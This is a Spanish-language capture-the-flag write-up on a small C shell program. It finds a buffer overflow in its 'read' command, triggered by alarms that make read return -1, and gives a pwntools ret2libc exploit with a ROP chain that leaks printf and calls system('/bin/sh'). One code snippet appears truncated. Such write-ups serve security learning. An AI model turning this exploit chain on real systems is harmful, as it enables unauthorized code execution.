Las variables se gestionan con get_var y put_var:

char *get_var(char *var)
{
    char *p = NULL;

    for (int32_t i = 0; i < VARS.size; i++)
    {
        if (VARS.kv[i].key == NULL)
            continue;

        if (strcmp(var, VARS.kv[i].key) == 0)
        {
            p = VARS.kv[i].val;
            break;
        }
    }

    return p;
}

int put_var(char *key, char *val)
{
    int32_t idx;

    idx = -1;
    for (int32_t i = 0; i < VARS.size; i++)
    {
        if (VARS.kv[i].key == NULL)
        {
            idx = i;
            break;
        }
    }

    if (idx < 0)
        return 1;

    VARS.kv[idx].key = strdup(key);
    VARS.kv[idx].val = strdup(val);

    if (VARS.kv[idx].key == NULL || VARS.kv[idx].val == NULL)
        return 1;

    return 0;
}

Nuevamente, la estructura VARS y la forma en que se usa es segura.

Comando echo

Esta función imprime la misma información proporcionada o muestra el valor de una variable dada (comenzando por $):

    if (params == NULL)
    {

        return 1;

    if (*params == '$')
    {

    else

Comando read

Aquí tenemos la forma de crear variables:

int cmd_read(char *params)
{
    char buf[4096] = { 0 };
    char *p;
    int32_t ret;
    int32_t read_bytes;
    uint32_t amnt;

    if (params == NULL)
    {
        printf(READ_HELP);
        return 1;
    }

    p = strchr(params, ' ');
    if (p == NULL)
    {
        printf(READ_HELP);
        return 1;
    }

    *p = '\0';

    if (get_var(p + 1) != NULL)
    {
        printf("read: variable $%s already exists\n", p + 1);
        return 1;
    }

    amnt = atoi(params);
    if (amnt == 0 || amnt >= sizeof(buf))
    {
        printf("read: invalid size\n");
        return 1;
    }

    read_bytes = 0;
    do
    {
        read_bytes += read(0, buf + read_bytes, amnt - read_bytes);
    } while (read_bytes != amnt);

    getchar();

    if (put_var(p + 1, buf) != 0)
        printf("read: maximum amount of variables reached\n");

    return 0;
}

La sintaxis es fácil, solo read <amount> <variable>, y el programa usará read con la cantidad especificada de caracteres.

El bug

Cuando leí todas las funciones, vi algún código extraño en cmd_read:

int cmd_read(char *params)
{
    // ...

    amnt = atoi(params);
    if (amnt == 0 || amnt >= sizeof(buf))
    {
        printf("read: invalid size\n");
        return 1;
    }

    read_bytes = 0;
    do
    {
        read_bytes += read(0, buf + read_bytes, amnt - read_bytes);
    } while (read_bytes != amnt);

    getchar();

    if (put_var(p + 1, buf) != 0)
        printf("read: maximum amount of variables reached\n");

    return 0;
}

La forma en que usa read es bastante rara. Parece que el tamaño de la variable debe ser exactamente el valor ingresado en el comando read:

No se detiene en el carácter de salto de línea.

También pensé que amnt era vulnerable a Integer Overflow, de modo que ingresar un número negativo nos daría la capacidad de usar read con una gran cantidad de bytes para leer. Pero no…

Como tenemos el código fuente, podemos agregar algunas instrucciones de depuración y recompilar el código:

int cmd_read(char *params)
{
    // ...

    amnt = atoi(params);
    printf("[DEBUG] amnt = %d (%u). sizeof(buf) = %ld\n", amnt, amnt, sizeof(buf));
    if (amnt == 0 || amnt >= sizeof(buf))
    {
        printf("read: invalid size\n");
        return 1;
    }

    read_bytes = 0;
    do
    {
        printf("Reading %d bytes\n", amnt - read_bytes);
        int ret = read(0, buf + read_bytes, amnt - read_bytes);
        read_bytes += ret;
        printf("Read %d bytes; ret = %d\n", read_bytes, ret);
    } while (read_bytes != amnt);

    getchar();

    if (put_var(p + 1, buf) != 0)
        printf("read: maximum amount of variables reached\n");

    return 0;
}

Estrategia de explotación

Para explotar la vulnerabilidad del Buffer Overflow, necesitamos establecer muchas alarmas para hacer que read lea suficientes bytes para ingresar a una cadena de ROP. Una vez que logremos eso, haremos un ataque ret2libc típico (una cadena de ROP para fugar una dirección de Glibc y saltarnos el ASLR y otra cadena ROP para llamar a system("/bin/sh")). Para obtener más información sobre el ataque ret2libc, consulte Here’s a LIBC, Shooting Star y Notepad as a Service.

Desarrollo del exploit

Veamos cuántos bytes debemos ingresar para controlar la dirección de retorno. Para eso, debemos adjuntar GDB al exploit de Python, ya que las alarmas en GDB no harán que read devuelva -1. Usaremos estas funciones:

def send_payload(payload: bytes):
    for _ in range(48):
        p.sendlineafter(PROMPT, b'alarm 2')

    p.sendlineafter(PROMPT, b'read 8 q')
    sleep(3)

    gdb.attach(p, 'continue')
    p.sendline(payload.ljust(8 + 48, b'A'))


def main():
    rop = ROP(elf)

    send_payload(cyclic(100))

    p.interactive()


if __name__ == '__main__':
    p = get_process()
    main()

Obsérvese que GDB se adjunta después de activar las alarmas. También tenga en cuenta que establecemos un total de 48 alarmas, para que obtengamos un desbordamiento de 48 bytes. De hecho, el programa se rompe. Usando cyclic de pwntools podemos saber cuántos caracteres necesitamos para controlar la dirección de retorno:

Como se dijo antes, el exploit es solo un ataque ret2libc. Aquí está el resto del exploit. No hay nada diferente de otros ataques ret2libc, solo la forma de obtener la vulnerabilidad de Buffer Overflow:

def main():
    rop = ROP(elf)

    payload  = b'A' * 8
    payload += p64(rop.rdi.address)
    payload += p64(elf.got.printf)
    payload += p64(elf.plt.puts)
    payload += p64(0x401290)

    send_payload(payload)

    printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))
    p.info(f'Leaked printf() address: {hex(printf_addr)}')

    glibc.address = printf_addr - glibc.sym.printf
    p.success(f'Glibc base address: {hex(glibc.address)}')

    payload  = b'A' * 8
    payload += p64(rop.rdi.address)
    payload += p64(next(glibc.search(b'/bin/sh')))
    payload += p64(rop.ret.address)
    payload += p64(glibc.sym.system)

    send_payload(payload)

    p.interactive()
